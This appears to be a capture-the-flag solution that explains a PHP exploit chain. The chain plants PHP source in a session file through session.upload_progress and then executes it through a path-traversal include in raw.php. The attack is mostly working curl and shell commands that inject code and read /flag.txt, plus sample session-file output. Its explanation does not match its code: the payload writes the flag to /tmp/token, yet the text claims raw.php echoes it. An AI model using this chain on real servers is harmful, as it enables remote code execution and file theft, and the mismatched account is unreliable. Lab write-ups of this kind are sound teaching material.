# Solution

The challenge requires the CVE-2026-109618 / CVE-2026-109619 class of bugs: PHP's `session.upload_progress` handler writes the raw filename of any upload to the session file `/tmp/sess_<SID>` before cleanup. The handler does NOT validate the filename. If a PUT/POST request contains a file part whose filename is PHP source, that source is on disk in the session file and is executed when the file is later included.

The included-page vulnerability is at `/raw.php`, which includes any path passed in the `page` parameter relative to `__DIR__ . '/data/'`. The `page` value allows `..` to traverse outside the data directory.

Steps for a solution:

```
sid=$(openssl rand -hex 16)
php_code='<?php file_put_contents("/tmp/token", file_get_contents("/flag.txt")); ?>'
curl -s -X POST http://localhost:9911/ -H "Cookie: PHPSESSID=$sid"   -F "PHP_SESSION_UPLOAD_PROGRESS=1"   -F "f=@-;filename=$php_code" <<< "body"
curl -s "http://localhost:9911/raw.php?page=../../tmp/sess_$sid"
```

The flag is echoed by raw.php after the include executes the PHP code in the session file.

The resulting PHP source in the session file may look like:```
upload_progress_tracking|a:5:{s:5:"start_time";i:................"<?php file_put_contents("/tmp/token", file_get_contents("/flag.txt")); ?>";}
```